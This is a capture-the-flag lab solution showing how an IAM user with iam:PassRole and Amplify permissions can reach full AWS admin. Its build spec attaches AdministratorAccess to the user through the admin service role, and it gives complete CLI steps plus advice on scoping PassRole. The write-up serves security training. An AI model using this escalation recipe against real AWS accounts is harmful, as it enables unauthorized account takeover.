# Solution: Privilege Escalation via iam:PassRole + amplify:CreateApp + amplify:CreateBranch + amplify:StartJob

AWS Amplify uses `amplify.yml` (or `buildspec.yml`) to define build commands that run during the CI/CD pipeline. These commands execute in a managed build container that has the Amplify app's service role credentials injected as environment variables. The AWS CLI comes pre-installed in the Amplify build environment, making it trivial to call IAM APIs directly from a build spec. When the service role has administrative permissions, the build commands effectively run with full admin access to the AWS account.

This attack leverages a property of `iam:PassRole`: the permission authorizes placing a role's credentials into a compute context controlled by a service. Any service that accepts a role ARN at creation time and later executes workloads as that role is a potential escalation vector. Amplify is particularly attractive because it accepts an `iamServiceRoleArn` parameter during app creation and runs arbitrary shell commands from the build spec -- all without any further IAM interaction after the initial `CreateApp` call.

Organizations that grant Amplify permissions without restricting `iam:PassRole` to specific, least-privilege service roles are vulnerable. The pattern is common in developer-facing AWS environments where teams are given broad Amplify access to deploy frontend applications.

## The Challenge

You start as `pl-prod-amplify-001-to-admin-starting-user`, an IAM user with the following key permissions:

- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-amplify-001-to-admin-admin-role`
- `amplify:CreateApp`, `amplify:CreateBranch`, `amplify:StartJob`
- CodeCommit permissions to interact with `pl-prod-amplify-001-to-admin-repo`

Your goal is to gain the effective permissions of `pl-prod-amplify-001-to-admin-admin-role`, which has `AdministratorAccess`. The Terraform deployment has pre-created the CodeCommit repository and the admin role; you need to weaponize them.

## Reconnaissance

Start by confirming your identity and understanding the environment:

```bash
aws sts get-caller-identity
```

The admin role `pl-prod-amplify-001-to-admin-admin-role` already exists and trusts `amplify.amazonaws.com`. You can verify this:

```bash
aws iam get-role --role-name pl-prod-amplify-001-to-admin-admin-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The CodeCommit repository `pl-prod-amplify-001-to-admin-repo` is empty and waiting for content. Your required permissions include `codecommit:GitPush` and `codecommit:GitPull` -- which means you can clone and push any content you want to the repo.

Note: in addition to the obvious push/pull perms, the exploitation also needs a handful of caller-side service-plumbing perms that AWS evaluates during `amplify:CreateApp`: `codecommit:GetRepository`, `codecommit:GetRepositoryTriggers`, `codecommit:PutRepositoryTriggers`, and `sns:CreateTopic` + `sns:Subscribe` on the shared `amplify_codecommit_topic` SNS topic. These aren't the principal "attack" actions -- Amplify silently invokes them as the caller to wire up the CodeCommit→SNS push-notification path -- but if any are missing, `CreateApp` fails with an `UnauthorizedException` before the admin role ever runs. See README "Required" for the full list.

## Exploitation

### Step 1: Push the malicious build spec to CodeCommit

Configure git to use your AWS credentials for CodeCommit authentication, then clone the empty repository:

```bash
git config --global credential.helper '!aws codecommit credential-helper $@'
git config --global credential.UseHttpPath true

git clone https://git-codecommit.{region}.amazonaws.com/v1/repos/pl-prod-amplify-001-to-admin-repo /tmp/amplify-exploit
cd /tmp/amplify-exploit
```

Create an `amplify.yml` that uses the build container's credentials (which will be the admin role) to attach `AdministratorAccess` to your starting user:

```yaml
version: 1
frontend:
  phases:
    preBuild:
      commands:
        - aws sts get-caller-identity
        - aws iam attach-user-policy --user-name pl-prod-amplify-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    build:
      commands:
        - echo "Build phase"
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
```

Commit and push:

```bash
git add amplify.yml
git commit -m "Add build spec"
git push -u origin HEAD:main
```

### Step 2: Create an Amplify app connected to the repository

Use `amplify:CreateApp` combined with `iam:PassRole` to create the app. The `--iam-service-role-arn` parameter is where PassRole occurs -- you are authorizing Amplify to use the admin role as the service role for all builds:

```bash
aws amplify create-app \
  --name pl-prod-amplify-001-to-admin-app \
  --repository https://git-codecommit.{region}.amazonaws.com/v1/repos/pl-prod-amplify-001-to-admin-repo \
  --iam-service-role-arn arn:aws:iam::{account_id}:role/pl-prod-amplify-001-to-admin-admin-role \
  --region {region} \
  --output json
```

Note the `appId` from the response -- you will need it in subsequent steps.

### Step 3: Create a branch

Amplify requires at least one branch before a job can be started:

```bash
aws amplify create-branch \
  --app-id {appId} \
  --branch-name main \
  --region {region}
```

### Step 4: Start the build job

Trigger a build. The Amplify service will pull your `amplify.yml` from the CodeCommit repository and execute the commands using the admin role's credentials:

```bash
aws amplify start-job \
  --app-id {appId} \
  --branch-name main \
  --job-type RELEASE \
  --region {region}
```

The build typically takes 2--5 minutes. You can monitor progress with:

```bash
aws amplify get-job \
  --app-id {appId} \
  --branch-name main \
  --job-id {jobId} \
  --region {region} \
  --query 'job.summary.status' \
  --output text
```

## Verification

After the build completes, verify that `AdministratorAccess` was attached to your starting user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-amplify-001-to-admin-starting-user
```

You should see `AdministratorAccess` in the output. Confirm the escalation worked by performing an admin-only action:

```bash
aws iam list-users --max-items 3
```

## Capture the Flag

With `AdministratorAccess` attached to your starting user, you now have `ssm:GetParameter` access across the account. Retrieve the CTF flag from SSM Parameter Store:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/amplify-001-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The `AdministratorAccess` policy includes `ssm:GetParameter` on all resources, so your starting user's credentials can read this parameter directly -- no role assumption required. The flag value is deployment-specific and stored at `/pathfinding-labs/flags/amplify-001-to-admin` in the prod account's SSM Parameter Store.

## What Happened

You exploited the fact that `iam:PassRole` combined with `amplify:CreateApp` allows an attacker to inject an administrative role into an Amplify CI/CD pipeline. Once the admin role is set as the service role, any build spec commands run with the full permissions of that role. The build container is ephemeral and managed by AWS, but the IAM side effects (attaching `AdministratorAccess`) are permanent until cleaned up.

This pattern generalizes to any AWS service that accepts a role ARN during resource creation and later executes workloads as that role: Batch (`jobRoleArn`), AppRunner (`instanceRoleArn`), SageMaker (`RoleArn`), CodeBuild (`serviceRole`), and many others. Restricting `iam:PassRole` to non-privileged service roles -- or scoping it with `iam:PassedToService` and resource conditions -- closes this class of escalation.
